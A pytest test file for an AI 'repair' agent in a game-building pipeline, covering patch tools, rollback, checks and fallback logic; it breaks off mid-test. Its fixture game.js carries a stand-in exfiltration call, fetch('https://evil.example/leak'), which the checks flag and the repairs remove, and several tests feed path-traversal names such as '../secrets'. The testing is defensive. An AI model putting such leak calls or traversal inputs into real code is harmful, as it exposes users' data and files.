"""repair 内层 agent：会话工具语义 + 节点接线/回退（全部离线，不触网不依赖 SDK）。"""
import time
import sys
from types import ModuleType, SimpleNamespace

import pytest

from app.agents import code_agent, nodes


def _files():
    return [
        {
            "path": "index.html",
            "content": '<html><head></head><body><canvas id="stage"></canvas><script src="game.js"></script></body></html>',
        },
        {"path": "style.css", "content": "canvas{display:block}"},
        {"path": "game.js", "content": "var score = 0; fetch('https://evil.example/leak');"},
    ]


def _apply_update(
    session,
    old: str,
    new: str,
    path: str = "game.js",
    *,
    move_to: str | None = None,
) -> str:
    return session.apply_patch_operation(
        "update_file",
        path=path,
        diff=f"-{old}\n+{new}",
        move_to=move_to,
    )


def _outcome(**overrides):
    base = dict(
        files=_files(),
        changed=["game.js"],
        tokens=321,
        logs=["agent patched game.js (1 chunk(s), 24B)"],
        note="FIXED: removed fetch call",
        checks_ok=True,
        turns=3,
    )
    base.update(overrides)
    return code_agent.RepairOutcome(**base)


# ---- RepairSession 工具面 ----

def test_session_read_patch_checks_roundtrip():
    s = code_agent.RepairSession.from_files(_files())
    assert "fetch" in s.read_file("game.js")
    report = s.run_checks()
    assert "CHECKS FAILED" in report and "fetch()" in report
    assert not s.checks_ok

    out = _apply_update(
        s,
        "var score = 0; fetch('https://evil.example/leak');",
        "var score = 0; function tick() { score += 1; }",
    )
    assert "run_checks" in out
    assert s.changed == {"game.js"}
    report = s.run_checks()
    assert "ALL CHECKS PASSED" in report
    assert s.checks_ok

    files = s.to_files()
    assert [f["path"] for f in files] == ["index.html", "style.css", "game.js"]
    assert "fetch" not in files[2]["content"]


def test_session_logs_to_live_step(monkeypatch):
    calls = []
    monkeypatch.setattr(
        code_agent.tracing,
        "record_step_log",
        lambda line, *, step_id=None, payload=None: calls.append((line, step_id, payload)) or True,
    )
    s = code_agent.RepairSession.from_files(_files(), live_step_id="step-1")

    s.read_file("game.js")

    assert s.log_lines[0].startswith("agent read game.js")
    assert calls[0][0] == s.log_lines[0]
    assert calls[0][1] == "step-1"
    assert calls[0][2]["type"] == "tool"
    assert calls[0][2]["tool"] == "read_file"
    assert calls[0][2]["path"] == "game.js"
    assert calls[0][2]["status"] == "done"
    assert isinstance(calls[0][2]["bytes"], int)


def test_session_read_files_batches_multiple_files(monkeypatch):
    calls = []
    monkeypatch.setattr(
        code_agent.tracing,
        "record_step_log",
        lambda line, *, step_id=None, payload=None: calls.append((line, step_id, payload)) or True,
    )
    s = code_agent.RepairSession.from_files(_files(), live_step_id="step-1")

    out = s.read_files(["game.js", "style.css", "game.js", "  "])

    assert out.count("=== game.js") == 1  # 重复路径去重
    assert "=== style.css" in out
    assert "fetch" in out and "canvas{display:block}" in out
    assert out.index("game.js") < out.index("style.css")  # 保持请求顺序
    assert s.context_files["game.js"]["record_source"] == "read_tool"
    assert s.context_files["style.css"]["record_source"] == "read_tool"
    assert s.changed == set()
    assert calls[-1][2]["tool"] == "read_files"
    assert calls[-1][2]["paths"] == ["game.js", "style.css"]
    assert calls[-1][2]["missing"] == []
    assert calls[-1][2]["status"] == "done"


def test_session_read_files_reports_missing_inline():
    s = code_agent.RepairSession.from_files(_files())

    out = s.read_files(["game.js", "nope.js"])

    assert "fetch" in out
    assert "no such file 'nope.js'" in out
    assert "nope.js" not in s.context_files


def test_session_read_files_rejects_empty_and_oversized_requests():
    s = code_agent.RepairSession.from_files(_files())

    assert s.read_files([]).startswith("error:")
    assert s.read_files(["", "  "]).startswith("error:")
    too_many = [f"f{i}.js" for i in range(17)]
    assert "max 16" in s.read_files(too_many)


def test_session_edit_logs_include_line_delta(monkeypatch):
    calls = []
    monkeypatch.setattr(
        code_agent.tracing,
        "record_step_log",
        lambda line, *, step_id=None, payload=None: calls.append((line, payload)) or True,
    )
    s = code_agent.RepairSession.from_files(_files(), live_step_id="step-1")

    s.apply_patch_operation(
        "update_file",
        path="game.js",
        diff=(
        "-var score = 0; fetch('https://evil.example/leak');\n"
        "+var ok = 1;\n"
            "+var score = 0;"
        ),
    )

    assert any(line.startswith("agent patched game.js (+2 -1,") for line, _payload in calls)
    assert any(
        payload
        and payload.get("type") == "file_change"
        and payload.get("path") == "game.js"
        and payload.get("added") == 2
        and payload.get("deleted") == 1
        and payload.get("cline_tool") == "editedExistingFile"
        and payload.get("diff_format") == "unified"
        and "files_in_context" in payload
        for _line, payload in calls
    )


def test_session_lists_and_searches_bundle_with_structured_events(monkeypatch):
    calls = []
    monkeypatch.setattr(
        code_agent.tracing,
        "record_step_log",
        lambda line, *, step_id=None, payload=None: calls.append((line, payload)) or True,
    )
    s = code_agent.RepairSession.from_files(_files(), live_step_id="step-1")

    listed = s.list_files()
    found = s.search_files("score", "*.js")

    assert "game.js" in listed and "script order: game.js" in listed
    assert "game.js:1:" in found
    assert any(payload and payload.get("cline_tool") == "listFilesTopLevel" for _line, payload in calls)
    search_payload = next(payload for _line, payload in calls if payload and payload.get("tool") == "search_files")
    assert search_payload["cline_tool"] == "searchFiles"
    assert search_payload["matches"][0]["path"] == "game.js"


def test_agent_heartbeat_logs_bundle_activity(monkeypatch):
    monkeypatch.setattr(code_agent.tracing, "record_step_log", lambda line, *, step_id=None, payload=None: True)
    s = code_agent.RepairSession.from_files(_files(), live_step_id="step-1")

    stop, thread = code_agent._start_heartbeat(s, agent_name="GameCodeAuthor", interval=0.01)
    try:
        for _ in range(30):
            if s.log_lines:
                break
            time.sleep(0.01)
    finally:
        code_agent._stop_heartbeat(stop, thread)

    assert any("agent authoring waiting on model response:" in line for line in s.log_lines)
    assert any("since last tool" in line for line in s.log_lines)
    assert any("bundle=3 file(s)" in line for line in s.log_lines)


def test_session_patch_resets_checks_flag():
    s = code_agent.RepairSession.from_files(_files())
    _apply_update(s, "var score = 0; fetch('https://evil.example/leak');", "var ok = 1;")
    s.run_checks()
    assert s.checks_ok
    _apply_update(s, "var ok = 1;", "var broken = ;")
    assert not s.checks_ok  # 新编辑未复检前不可视为通过


def test_session_rejects_unknown_path_and_oversize():
    s = code_agent.RepairSession.from_files(_files())
    assert "no such file" in _apply_update(s, "x", "y", path="evil.js")
    assert "no such file" in s.read_file("nope.js")
    big = "x" * (code_agent.validation.MAX_FILE_BYTES + 1)
    assert "exceeds" in _apply_update(
        s, "var score = 0; fetch('https://evil.example/leak');", big
    )
    assert s.changed == set()


def test_session_rejects_invalid_structured_patch_inputs():
    s = code_agent.RepairSession.from_files(_files())
    assert "context not found" in _apply_update(
        s, "var missing = true;", "var ok = true;"
    )
    assert "unsupported" in s.apply_patch_operation(
        "rename_file", path="game.js", diff=None
    )
    assert s.changed == set()


def test_session_patch_records_structured_delta():
    s = code_agent.RepairSession.from_files(_files())
    original = s.contents["game.js"]

    assert "run_checks" in _apply_update(s, original, "var score = 1;")

    delta = s.last_patch_delta
    assert delta is not None and delta.exact
    assert len(delta.changes) == 1
    change = delta.changes[0]
    assert change.kind == "update"
    assert change.path == "game.js"
    assert change.old_content == original
    assert change.new_content == "var score = 1;"
    assert change.added_lines == 1 and change.deleted_lines == 1


def test_session_patch_supports_move_and_update():
    files = _files() + [{"path": "shop.js", "content": "var shopOpen = false;"}]
    s = code_agent.RepairSession.from_files(files)
    out = _apply_update(
        s,
        "var shopOpen = false;",
        "var shopOpen = true;",
        path="shop.js",
        move_to="store.js",
    )

    assert "moved shop.js -> store.js" in out
    assert "shop.js" not in s.contents
    assert s.contents["store.js"] == "var shopOpen = true;"
    assert s.order[-1] == "store.js"
    assert s.changed == {"shop.js", "store.js"}
    assert s.last_patch_delta is not None
    assert s.last_patch_delta.changes[0].kind == "move"
    assert s.last_patch_delta.changes[0].move_to == "store.js"


def test_native_apply_patch_editor_reports_success_and_failure():
    from app.agents.agent_tools import _RepairSessionPatchEditor

    class Result:
        def __init__(self, *, status, output):
            self.status = status
            self.output = output

    s = code_agent.RepairSession.from_files(_files())
    editor = _RepairSessionPatchEditor(s, Result)
    success = editor.update_file(
        SimpleNamespace(
            path="game.js",
            diff=(
                "-var score = 0; fetch('https://evil.example/leak');\n"
                "+var score = 1;"
            ),
            move_to=None,
        )
    )
    failure = editor.delete_file(SimpleNamespace(path="game.js", diff=None, move_to=None))

    assert success.status == "completed" and "run_checks" in success.output
    assert failure.status == "failed" and "cannot delete" in failure.output


def test_native_apply_patch_editor_uses_structured_operations_directly():
    from app.agents.agent_tools import _RepairSessionPatchEditor

    class Result:
        def __init__(self, *, status, output):
            self.status = status
            self.output = output

    s = code_agent.RepairSession.from_files(_files())
    assert not hasattr(s, "apply_patch")
    editor = _RepairSessionPatchEditor(s, Result)

    created = editor.create_file(
        SimpleNamespace(path="helper.js", diff="+export const ready = false;", move_to=None)
    )
    moved = editor.update_file(
        SimpleNamespace(
            path="helper.js",
            diff="-export const ready = false;\n+export const ready = true;",
            move_to="runtime.js",
        )
    )
    deleted = editor.delete_file(
        SimpleNamespace(path="runtime.js", diff=None, move_to=None)
    )

    assert [created.status, moved.status, deleted.status] == [
        "completed",
        "completed",
        "completed",
    ]
    assert [delta.changes[0].kind for delta in s.patch_deltas[-3:]] == [
        "add",
        "move",
        "delete",
    ]
    assert "helper.js" not in s.contents and "runtime.js" not in s.contents


def test_structured_patch_operation_rejects_full_patch_envelope_atomically():
    s = code_agent.RepairSession.from_files(_files())
    original = dict(s.contents)

    out = s.apply_patch_operation(
        "update_file",
        path="game.js",
        diff=(
            "*** Begin Patch\n"
            "*** Update File: game.js\n"
            "-var score = 0; fetch('https://evil.example/leak');\n"
            "+var score = 1;\n"
            "*** End Patch"
        ),
    )

    assert "must contain only V4A content/context lines" in out
    assert s.contents == original
    assert s.changed == set() and s.last_patch_delta is None


def test_make_tools_exposes_apply_patch_as_function_tool():
    tools = code_agent._make_tools(code_agent.RepairSession.from_files(_files()))

    patch_tool = next(tool for tool in tools if getattr(tool, "name", None) == "apply_patch")
    patch_set_tool = next(tool for tool in tools if getattr(tool, "name", None) == "apply_patch_set")
    assert patch_tool.__class__.__name__ == "FunctionTool"
    assert patch_set_tool.__class__.__name__ == "FunctionTool"
    assert not any(getattr(tool, "type", None) == "apply_patch" for tool in tools)


def test_make_tools_exposes_read_files_in_both_modes():
    session = code_agent.RepairSession.from_files(_files())
    for author in (False, True):
        tools = code_agent._make_tools(session, author=author)
        names = [getattr(tool, "name", None) for tool in tools]
        assert names.index("read_file") + 1 == names.index("read_files")  # 固定顺序，prompt cache 前缀稳定


def test_session_applies_multi_file_patch_atomically():
    session = code_agent.RepairSession.from_files(_files())

    out = session.apply_patch_operations(
        [
            {
                "operation_type": "update_file",
                "path": "game.js",
                "diff": "-var score = 0; fetch('https://evil.example/leak');\n+var score = 1;",
            },
            {
                "operation_type": "update_file",
                "path": "style.css",
                "diff": "-canvas{display:block}\n+canvas{display:block;background:#000}",
            },
        ]
    )

    assert "game.js" in out and "style.css" in out
    assert session.read_file("game.js") == "var score = 1;"
    assert "background:#000" in session.read_file("style.css")
    assert len(session.patch_deltas[-1].changes) == 2


def test_session_rolls_back_multi_file_patch_when_one_operation_fails():
    session = code_agent.RepairSession.from_files(_files())
    original = dict(session.contents)

    out = session.apply_patch_operations(
        [
            {
                "operation_type": "update_file",
                "path": "game.js",
                "diff": "-var score = 0; fetch('https://evil.example/leak');\n+var score = 1;",
            },
            {
                "operation_type": "update_file",
                "path": "missing.js",
                "diff": "-x\n+y",
            },
        ]
    )

    assert out.startswith("error: operation 2:")
    assert session.contents == original
    assert session.changed == set() and session.last_patch_delta is None


def test_session_applies_anchored_section_patch():
    files = _files()
    files[2]["content"] = (
        "function setup() {\n  var a = 1;\n}\n"
        "function update() {\n  var a = 1;\n}\n"
    )
    s = code_agent.RepairSession.from_files(files)
    out = s.apply_patch_operation(
        "update_file",
        path="game.js",
        diff="@@ function update() {\n-  var a = 1;\n+  var a = 2;",
    )
    assert "run_checks" in out
    body = s.read_file("game.js")
    # @@ 锚点必须命中第二处同名行，setup 里的保持不动
    assert "function setup() {\n  var a = 1;\n}" in body
    assert "function update() {\n  var a = 2;\n}" in body


def test_session_rejects_noop_patch():
    s = code_agent.RepairSession.from_files(_files())
    line = "var score = 0; fetch('https://evil.example/leak');"
    assert "no changes" in _apply_update(s, line, line)
    assert s.changed == set()


def test_session_preserves_crlf():
    files = _files()
    files[2]["content"] = "var a = 1;\r\nvar b = 2;\r\n"
    s = code_agent.RepairSession.from_files(files)
    assert "run_checks" in _apply_update(s, "var b = 2;", "var b = 3;")
    assert s.contents["game.js"] == "var a = 1;\r\nvar b = 3;\r\n"


def test_skills_expose_runtime_contract():
    s = code_agent.RepairSession.from_files(_files())
    assert "gameweave-runtime" in s.list_skills()
    body = s.read_skill("gameweave-runtime")
    assert "postMessage" in body and "400KB" in body
    assert "unknown skill" in s.read_skill("nope")
    assert "unknown skill" in s.read_skill("../secrets")  # 路径穿越拒绝


def test_enabled_requires_flag_and_real_model(monkeypatch):
    monkeypatch.setattr(code_agent.settings, "CODE_AGENT_ENABLED", False)
    assert not code_agent.enabled({"use_real": True})
    monkeypatch.setattr(code_agent.settings, "CODE_AGENT_ENABLED", True)
    assert code_agent.enabled({"use_real": True})
    assert not code_agent.enabled({"use_real": False})
    assert not code_agent.enabled({})


# ---- 节点接线：agent 成功 / 不收敛回退 / 不可用回退 ----

def test_repair_node_uses_agent_outcome(monkeypatch):
    monkeypatch.setattr(code_agent, "enabled", lambda state: True)
    monkeypatch.setattr(code_agent, "run_repair", lambda files, **kw: _outcome())
    out = nodes.repair_code_node(
        {
            "repair_attempts": 0,
            "last_error": "forbidden API in game.js: fetch()",
            "generated_files": _files(),
            "use_real": True,
            "dimension": "2d",
        }
    )
    assert out["repair_attempts"] == 1
    assert out["_tokens_delta"] == 321
    assert out["_agent"] == "GameCodeAgentRepair"
    assert any("agent tool loop" in line for line in out["_logs"])
    assert any("agent self-checks passed" in line for line in out["_logs"])


def test_repair_node_falls_back_when_agent_unavailable(monkeypatch):
    monkeypatch.setattr(code_agent, "enabled", lambda state: True)
    monkeypatch.setattr(code_agent, "run_repair", lambda files, **kw: None)
    seen = {}

    def fake_generate(state, repair_error=None):
        seen["error"] = repair_error
        return _files(), 7, "template", []

    monkeypatch.setattr(nodes, "_generate_code", fake_generate)
    out = nodes.repair_code_node(
        {"repair_attempts": 1, "last_error": "boom", "generated_files": _files(), "use_real": True}
    )
    assert seen["error"] == "boom"
    assert out["repair_attempts"] == 2
    assert out["_tokens_delta"] == 7
    assert any("falling back to full regeneration" in line for line in out["_logs"])


def test_repair_node_fallback_keeps_agent_tokens(monkeypatch):
    monkeypatch.setattr(code_agent, "enabled", lambda state: True)
    monkeypatch.setattr(
        code_agent, "run_repair", lambda files, **kw: _outcome(checks_ok=False, note="GIVEUP: cannot fix")
    )
    monkeypatch.setattr(nodes, "_generate_code", lambda state, repair_error=None: (_files(), 10, "template", []))
    out = nodes.repair_code_node(
        {"repair_attempts": 0, "last_error": "boom", "generated_files": _files(), "use_real": True}
    )
    # agent 花掉的 tokens 也要并入步骤增量，与 LLMCall 记账口径一致
    assert out["_tokens_delta"] == 331
    assert any("did not converge" in line for line in out["_logs"])


def test_repair_node_legacy_path_when_disabled(monkeypatch):
    monkeypatch.setattr(nodes, "_generate_code", lambda state, repair_error=None: (_files(), 5, "template", []))
    called = {"agent": False}
    monkeypatch.setattr(code_agent, "run_repair", lambda *a, **kw: called.__setitem__("agent", True))
    out = nodes.repair_code_node({"repair_attempts": 0, "last_error": "x", "generated_files": _files()})
    assert not called["agent"]  # 默认关闭：完全不进 agent 路径
    assert out["_tokens_delta"] == 5


def test_repair_node_uses_author_flag_and_preserves_failing_vite_candidate(monkeypatch):
    from app.services.phaser_projects import create_modular_phaser_project
    from app.services.vite_projects import VITE_PROJECT_FORMAT

    project = create_modular_phaser_project({"title": "T"}, {}, {}, {})
    repaired = [dict(file) for file in project]
    repaired[-1] = {
        **repaired[-1],
        "content": str(repaired[-1].get("content") or "") + "\n// attempted repair",
    }
    outcome = code_agent.RepairOutcome(
        files=repaired,
        changed=[str(repaired[-1]["path"])],
        tokens=44,
        logs=["agent project checks: typecheck/build failed: TS2322"],
        note="GIVEUP: one type error remains",
        checks_ok=False,
        turns=4,
    )
    monkeypatch.setattr(code_agent, "enabled", lambda state: False)
    monkeypatch.setattr(code_agent, "author_enabled", lambda state: True)
    monkeypatch.setattr(code_agent, "run_repair", lambda files, **kw: outcome)
    monkeypatch.setattr(
        nodes,
        "_generate_code",
        lambda *args, **kwargs: (_ for _ in ()).throw(
            AssertionError("authored Vite candidate must not be replaced by the template")
        ),
    )

    out = nodes.repair_code_node(
        {
            "repair_attempts": 0,
            "last_error": "TS2322",
            "artifact_format": VITE_PROJECT_FORMAT,
            "project_files": project,
            "use_real": True,
            "dimension": "2d",
        }
    )

    assert out["repair_attempts"] == 1
    assert out["project_files"] == repaired
    assert out["_tokens_delta"] == 44
    assert any("preserved repaired project" in line for line in out["_logs"])


def test_revision_repair_node_agent_path_requires_changes(monkeypatch):
    monkeypatch.setattr(code_agent, "enabled", lambda state: True)
    monkeypatch.setattr(code_agent, "run_repair", lambda files, **kw: _outcome(changed=[]))
    monkeypatch.setattr(
        nodes, "_generate_revision_code", lambda state, repair_error=None: (_files(), 4, ["game.js"], "model")
    )
    out = nodes.revision_repair_node(
        {
            "repair_attempts": 0,
            "last_error": "revision produced no file changes",
            "generated_files": _files(),
            "use_real": True,
            "task_kind": "revision",
            "base_version": "v2",
        }
    )
    # 空编辑不满足 revision 门禁 → 回落单次修订，但 agent tokens 保留
    assert out["_tokens_delta"] == 4 + 321
    assert out["revision_result"]["changed_files"] == ["game.js"]


def test_revision_repair_node_uses_agent_outcome(monkeypatch):
    monkeypatch.setattr(code_agent, "enabled", lambda state: True)
    monkeypatch.setattr(code_agent, "run_repair", lambda files, **kw: _outcome())
    out = nodes.revision_repair_node(
        {
            "repair_attempts": 0,
            "last_error": "forbidden API in game.js: fetch()",
            "generated_files": _files(),
            "use_real": True,
            "task_kind": "remix",
            "base_version": "v3",
        }
    )
    assert out["repair_attempts"] == 1
    assert out["revision_result"] == {"changed_files": ["game.js"], "base_version": "v3"}
    assert out["_tokens_delta"] == 321
    assert out["validation_result"] == {} and out["gameplay_qa_result"] == {}


def test_run_repair_returns_none_for_empty_bundle():
    assert code_agent.run_repair([], error="whatever") is None


def test_build_input_labels_failure_source():
    default = code_agent._build_input(_files(), "boom", "2d", None)
    assert default.startswith("Build validation failed with:")
    qa = code_agent._build_input(_files(), "boom", "2d", None, failure_label="Browser gameplay QA")
    assert qa.startswith("Browser gameplay QA failed with:")


# ---- gameplay repair：运行时报错走最小 patch，玩法指标仍整包重生成 ----

def _qa_result(issues):
    return {"passed": False, "issues": issues, "warnings": [], "metrics": {}}


def test_classify_gameplay_failure_runtime_vs_design():
    runtime = ["browser page error: TypeError: this.enemies.children.iterate is not a function"]
    kind, picked = nodes._classify_gameplay_failure(_qa_result(runtime))
    assert kind == "runtime" and picked == runtime
    # 崩溃伴随的零帧/超时是症状，不改变运行时判定
    kind, picked = nodes._classify_gameplay_failure(
        _qa_result(runtime + ["browser sandbox observed no game-loop activity"])
    )
    assert kind == "runtime" and picked == runtime
    # 混入玩法指标问题 → 必须整包重生成
    assert nodes._classify_gameplay_failure(_qa_result(runtime + ["no input handling found"]))[0] == "design"
    assert nodes._classify_gameplay_failure(_qa_result(["no input handling found"])) == ("design", [])
    # 只有症状没有报错，patch 无从下手
    assert nodes._classify_gameplay_failure(_qa_result(["browser sandbox observed no game-loop activity"]))[0] == "design"
    assert nodes._classify_gameplay_failure({})[0] == "design"


_SHEET_ISSUE = (
    "generated sprite sheet is preloaded but never used: build sprites and animations "
    "from gameConfig.sheet frames instead of procedural shapes"
)


def test_classify_gameplay_failure_quality_issues_are_patchable():
    # 质量门禁（素材未接线等）是局部接线问题 → 最小 patch，不整包重生成
    kind, picked = nodes._classify_gameplay_failure(_qa_result([_SHEET_ISSUE]))
    assert kind == "quality" and picked == [_SHEET_ISSUE]
    # 质量问题混运行时报错 → 仍走 patch，两类问题都交给 agent
    runtime = "browser page error: TypeError: boom"
    kind, picked = nodes._classify_gameplay_failure(_qa_result([runtime, _SHEET_ISSUE]))
    assert kind == "runtime" and set(picked) == {runtime, _SHEET_ISSUE}
    # 混入玩法指标问题 → 整包重生成
    assert nodes._classify_gameplay_failure(_qa_result([_SHEET_ISSUE, "no input handling found"]))[0] == "design"
    # 质量问题伴随零帧症状：包可能根本没跑起来，patch 无从下手
    assert (
        nodes._classify_gameplay_failure(
            _qa_result([_SHEET_ISSUE, "browser sandbox observed no game-loop activity"])
        )[0]
        == "design"
    )


def test_gameplay_repair_patches_quality_issue(monkeypatch):
    monkeypatch.setattr(code_agent, "enabled", lambda state: True)
    seen = {}

    def fake_repair(files, **kw):
        seen.update(kw)
        return _outcome()

    monkeypatch.setattr(code_agent, "run_repair", fake_repair)
    out = nodes.gameplay_repair_node(
        {
            "gameplay_repair_attempts": 0,
            "generated_files": _files(),
            "use_real": True,
            "dimension": "2d",
            "gameplay_qa_result": _qa_result([_SHEET_ISSUE]),
        }
    )
    assert seen["failure_label"] == "Gameplay quality QA"
    assert "sprite sheet" in seen["error"]
    assert "run_checks" in seen["task_note"] and "sheetFrame" in seen["task_note"]
    assert out["gameplay_repair_attempts"] == 1
    # patch 不动设计与难度
    assert "balance_config" not in out and "game_design" not in out
    assert nodes.next_after_gameplay_repair(out) == "project_build"


def test_gameplay_repair_regen_carries_qa_feedback(monkeypatch):
    # patch 不收敛回落整包重生成时，失因清单必须带给下一轮 code_generation
    monkeypatch.setattr(code_agent, "enabled", lambda state: True)
    monkeypatch.setattr(code_agent, "run_repair", lambda files, **kw: _outcome(changed=[]))
    out = nodes.gameplay_repair_node(
        {
            "gameplay_repair_attempts": 0,
            "generated_files": _files(),
            "use_real": True,
            "gameplay_qa_result": _qa_result([_SHEET_ISSUE]),
        }
    )
    assert out["generated_files"] == []
    assert out["gameplay_qa_feedback"] == [_SHEET_ISSUE]
    assert nodes.next_after_gameplay_repair(out) == "code_generation"


def test_build_author_input_includes_qa_feedback():
    from app.agents import author_runner

    with_feedback = author_runner._build_author_input(
        _files(), {"title": "T"}, {}, "phaser-vite", "2d", [_SHEET_ISSUE]
    )
    assert "FAILED gameplay QA" in with_feedback and "sprite sheet" in with_feedback
    without = author_runner._build_author_input(_files(), {"title": "T"}, {}, "phaser-vite", "2d")
    assert "FAILED gameplay QA" not in without


def test_gameplay_repair_patches_runtime_error(monkeypatch):
    monkeypatch.setattr(code_agent, "enabled", lambda state: True)
    seen = {}

    def fake_repair(files, **kw):
        seen.update(kw)
        return _outcome()

    monkeypatch.setattr(code_agent, "run_repair", fake_repair)
    out = nodes.gameplay_repair_node(
        {
            "gameplay_repair_attempts": 0,
            "generated_files": _files(),
            "use_real": True,
            "dimension": "2d",
            "balance_config": {"target_score": 100},
            "gameplay_qa_result": _qa_result(
                ["browser page error: TypeError: this.enemies.children.iterate is not a function"]
            ),
        }
    )
    assert seen["failure_label"] == "Browser gameplay QA"
    assert "children.iterate" in seen["error"]
    assert out["gameplay_repair_attempts"] == 1
    assert out["generated_files"] == _files()
    assert out["_tokens_delta"] == 321
    assert out["validation_result"] == {} and out["gameplay_qa_result"] == {}
    # patch 不动设计与难度
    assert "balance_config" not in out and "game_design" not in out
    # patch 产物统一经过 project_build；legacy bundle 在该节点直接透传后复检
    assert nodes.next_after_gameplay_repair(out) == "project_build"


def test_gameplay_repair_empty_edit_falls_back_to_regeneration(monkeypatch):
    monkeypatch.setattr(code_agent, "enabled", lambda state: True)
    monkeypatch.setattr(code_agent, "run_repair", lambda files, **kw: _outcome(changed=[]))
    out = nodes.gameplay_repair_node(
        {
            "gameplay_repair_attempts": 0,
            "generated_files": _files(),
            "use_real": True,
            "gameplay_qa_result": _qa_result(["browser console error: boom"]),
        }
    )
    # 浏览器 bug 在 run_checks 里不复现，空编辑等于没修 → 回落整包重生成
    assert out["generated_files"] == []
    assert out["balance_config"]["repair_attempt"] == 1
    assert out["_tokens_delta"] == 321  # agent 花掉的 tokens 仍记账
    assert nodes.next_after_gameplay_repair(out) == "code_generation"


def test_gameplay_repair_design_issue_skips_agent(monkeypatch):
    monkeypatch.setattr(code_agent, "enabled", lambda state: True)
    called = {"agent": False}
    monkeypatch.setattr(code_agent, "run_repair", lambda *a, **kw: called.__setitem__("agent", True))
    out = nodes.gameplay_repair_node(
        {
            "gameplay_repair_attempts": 0,
            "generated_files": _files(),
            "use_real": True,
            "gameplay_qa_result": _qa_result(["no input handling found"]),
        }
    )
    assert not called["agent"]  # 玩法指标问题不进 patch 路径
    assert out["generated_files"] == []
    assert out["balance_config"] and out["game_design"]
    assert out["_tokens_delta"] == 0


def test_gameplay_repair_legacy_path_when_disabled(monkeypatch):
    called = {"agent": False}
    monkeypatch.setattr(code_agent, "run_repair", lambda *a, **kw: called.__setitem__("agent", True))
    out = nodes.gameplay_repair_node(
        {
            "gameplay_repair_attempts": 1,
            "generated_files": _files(),
            "gameplay_qa_result": _qa_result(["browser page error: TypeError: boom"]),
        }
    )
    assert not called["agent"]  # 默认关闭：运行时报错也走旧的重生成路径
    assert out["generated_files"] == []
    assert out["gameplay_repair_attempts"] == 2
    # 开关没开导致的回落必须留痕，不能静默
    assert any("code agent disabled" in line for line in out["_logs"])


# ---- 作者模式：Add/Delete/write_file 与多文件 bundle 的契约 ----


def test_session_add_delete_files():
    s = code_agent.RepairSession.from_files(_files())
    out = s.apply_patch_operation(
        "create_file",
        path="shop.js",
        diff=(
            "+var shopOpen = false;\n"
            "+function toggleShop(){ shopOpen = !shopOpen; }"
        ),
    )
    assert "added shop.js" in out
    assert s.read_file("shop.js").startswith("var shopOpen")
    assert "shop.js" in s.changed and s.order[-1] == "shop.js"
    # 平铺路径 + 扩展名白名单：路径穿越与额外 html 都拒绝
    assert "invalid new file path" in s.apply_patch_operation(
        "create_file", path="../evil.js", diff="+var x = 1;"
    )
    assert "invalid new file path" in s.apply_patch_operation(
        "create_file", path="page.html", diff="+<html></html>"
    )
    # 已存在的文件必须走 Update
    assert "already exists" in s.apply_patch_operation(
        "create_file", path="shop.js", diff="+var x = 1;"
    )
    # 三件套不可删；模块可删
    assert "cannot delete" in s.apply_patch_operation("delete_file", path="game.js")
    assert "deleted shop.js" in s.apply_patch_operation("delete_file", path="shop.js")
    assert "shop.js" not in s.order


def test_session_add_respects_file_count_cap(monkeypatch):
    monkeypatch.setattr(code_agent.validation, "MAX_BUNDLE_FILES", 4)
    s = code_agent.RepairSession.from_files(_files())
    assert "added a.js" in s.apply_patch_operation(
        "create_file", path="a.js", diff="+var a = 1;"
    )
    assert "max 4" in s.apply_patch_operation(
        "create_file", path="b.js", diff="+var b = 1;"
    )


def test_session_write_file_creates_and_replaces():
    s = code_agent.RepairSession.from_files(_files())
    out = s.write_file("hud.js", "var hud = 1;")
    assert "wrote hud.js" in out and "Wire it into index.html" in out
    assert s.order[-1] == "hud.js" and "hud.js" in s.changed
    # 整文件替换已有文件（作者模式写 game.js 核心用）
    assert "wrote game.js" in s.write_file("game.js", "var score = 1;")
    assert s.read_file("game.js") == "var score = 1;"
    # 路径与体积约束
    assert "invalid new file path" in s.write_file("../x.js", "var x = 1;")
    assert "invalid new file path" in s.write_file("sub/dir.js", "var x = 1;")
    big = "x" * (code_agent.validation.MAX_FILE_BYTES + 1)
    assert "over the" in s.write_file("big.js", big)


def test_project_session_supports_nested_typescript_and_isolated_build(monkeypatch):
    from app.services import sandbox_client
    from app.services.artifacts import text_artifact
    from app.services.phaser_projects import create_modular_phaser_project

    project = create_modular_phaser_project(
        {"title": "Agent Project", "archetype": "topdown_collect"}, {}, {}, {}
    )
    session = code_agent.RepairSession.from_files(project)
    created = session.write_file(
        "src/systems/ComboSystem.ts",
        "export class ComboSystem { value = 0; add(): void { this.value += 1; } }",
    )
    assert "Import it from an existing module" in created
    assert "invalid new file path" in session.write_file("../escape.ts", "export {}")
    monkeypatch.setattr(
        sandbox_client,
        "build_vite_project",
        lambda *_args, **_kwargs: sandbox_client.ViteBuildResult(
            ok=True,
            files=[text_artifact("index.html", "<html></html>")],
            duration_ms=15,
        ),
    )
    assert "ALL CHECKS PASSED" in session.run_checks()


def test_project_checks_log_build_errors(monkeypatch):
    from app.services import sandbox_client
    from app.services.phaser_projects import create_modular_phaser_project

    project = create_modular_phaser_project(
        {"title": "Broken Project", "archetype": "logic_grid"}, {}, {}, {}
    )
    captured = []
    monkeypatch.setattr(
        code_agent.tracing,
        "record_step_log",
        lambda line, *, step_id=None, payload=None: captured.append((line, payload)),
    )
    monkeypatch.setattr(
        sandbox_client,
        "build_vite_project",
        lambda *_args, **_kwargs: sandbox_client.ViteBuildResult(
            ok=False,
            errors=["src/scenes/PlayScene.ts(8,3): error TS2322: type mismatch"],
            duration_ms=21,
        ),
    )

    session = code_agent.RepairSession.from_files(project, live_step_id="step-1")
    result = session.run_checks()

    assert "TS2322" in result
    line, payload = captured[-1]
    assert "TS2322" in line
    assert payload["errors"] == [
        "src/scenes/PlayScene.ts(8,3): error TS2322: type mismatch"
    ]
    assert payload["duration_ms"] == 21


def test_run_checks_accepts_referenced_module_bundle():
    files = [
        {
            "path": "index.html",
            "content": '<html><head></head><body><canvas id="stage"></canvas>'
            '<script src="helpers.js"></script><script src="game.js"></script></body></html>',
        },
        {"path": "style.css", "content": "canvas{display:block}"},
        {"path": "helpers.js", "content": "var HELPER = { boost: 2 };"},
        {"path": "game.js", "content": "var score = HELPER.boost;"},
    ]
    s = code_agent.RepairSession.from_files(files)
    assert "ALL CHECKS PASSED" in s.run_checks()


def test_run_checks_flags_unreferenced_module():
    files = _files() + [{"path": "shop.js", "content": "var shop = 1;"}]
    s = code_agent.RepairSession.from_files(files)
